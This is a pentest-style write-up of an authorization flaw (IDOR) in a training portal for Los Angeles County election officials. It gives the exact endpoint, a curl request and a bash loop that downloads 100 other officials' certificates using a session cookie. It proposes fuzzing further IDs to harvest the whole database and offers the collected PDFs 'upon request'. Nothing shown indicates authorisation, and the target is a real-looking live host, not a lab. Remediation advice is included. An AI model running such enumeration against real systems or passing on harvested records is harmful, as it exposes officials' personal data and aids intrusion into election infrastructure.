# [HTB-Style] Clarity Elections LMS: Certificate IDOR

**Quick Summary**  
While pentesting a training portal for election officials, I stumbled upon an endpoint that serves PDF certificates. By simply changing the `id_course` parameter, I could download **any** course completion certificate – no ownership check at all. The result? Full access to other users’ training records, names, and course histories.

---

## Initial Recon

The target is the Los Angeles County instance of Clarity Elections’ LMS platform:

```
https://losangeles.training.clarityelections.com/
```

After logging in with a low-privileged user account, I browsed to the “My Certificates” section. Hovering over a download link revealed a predictable pattern:

```text
/appLms/index.php?r=mycertificate/downloadCert&id_certificate=9&id_course=1
```

Two integers were right there in the URL: `id_certificate` (my certificate ID) and `id_course` (the course ID). That looked ripe for an IDOR.

---

## Enumeration

I fired up Burp Suite and intercepted a certificate download request for my own completed course:

```http
GET /appLms/index.php?r=mycertificate/downloadCert&id_certificate=9&id_course=1 HTTP/1.1
Host: losangeles.training.clarityelections.com
Cookie: [valid session]
```

The server responded with a PDF certificate containing my name and course title – so far, so good.

Now for the test: I changed `id_course` to `2` and sent the request again.

```bash
curl -s -b "PHPSESSID=..." \
  "https://losangeles.training.clarityelections.com/appLms/index.php?r=mycertificate/downloadCert&id_certificate=9&id_course=2" \
  -o cert2.pdf
```

**Boom.** I received a completely different certificate, showing someone else’s name and a different course. The server didn’t check whether `id_certificate=9` actually belonged to me, nor whether I was authorised for `id_course=2`.

I wrote a quick loop to scrape everything from `id_course=1` to `100`:

```bash
for i in {1..100}; do
  curl -s -b "PHPSESSID=..." \
    "https://losangeles.training.clarityelections.com/appLms/index.php?r=mycertificate/downloadCert&id_certificate=9&id_course=$i" \
    -o "cert_$i.pdf"
done
```

Every single response was a valid PDF certificate – 100 courses worth of other users’ training data.

---

## Exploitation

**Vulnerability:** Insecure Direct Object Reference (IDOR) – Missing ownership validation.

The application trusts the user-supplied `id_course` and `id_certificate` values without verifying the relationship to the authenticated user. An attacker who knows (or guesses) a valid `id_certificate` can:

- Enumerate all course certificates linked to that certificate ID.
- Potentially iterate over `id_certificate` itself to harvest the entire database of certificates.

In this proof-of-concept I kept `id_certificate=9` constant, but I could have easily fuzzed that parameter as well.

**Harvested Information per Certificate:**  
- Full name of the learner  
- Course title and completion date  
- Issuing authority (Los Angeles County RR/CC)  
- Certificate number  

These are enough for social engineering, impersonation, or undermining compliance audits.

---

## Impact

| Risk | Detail |
|------|--------|
| **PII Leakage** | Real names, training histories exposed. |
| **Audit Trail Integrity** | Certificates can be duplicated without detection. |
| **Compliance Violation** | Election official training records are sensitive; unauthorised access could lead to regulatory breaches. |
| **Wormable** | Sequential IDs allow mass-downloading of all certificates in one shot. |

A malicious insider or a compromised low-level account could vacuum up thousands of certificates in minutes.

---

## Remediation (The Fix)

1. **Check ownership** – On the backend, verify that `id_certificate` belongs to the currently logged-in `user_id` before serving the file.
2. **Use indirect references** – Map public UUIDs to real IDs instead of exposing sequential integers.
3. **Enforce access control globally** – Implement a middleware that checks permissions for every `/mycertificate/*` route.
4. **Add rate limiting & monitoring** – Block rapid enumeration and alert on sequential download patterns.

---

## Lessons Learned

- **Never trust client-supplied IDs.** Even if they are hidden in a POST body, an attacker can still modify them.
- **IDORs are often hiding in “user profile” areas** – check every download, export, and view endpoint for missing authorisation.
- **Training platforms are goldmines for PII.** If you’re pentesting an LMS, always hit the certificate/module endpoints.

---

**Severity:** High  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Proof-of-Concept Files:** 100 PDF certificates (available upon request).  

*That’s how a simple parameter fiddling turned into a full-blown data exposure. Until next time – happy hunting!*
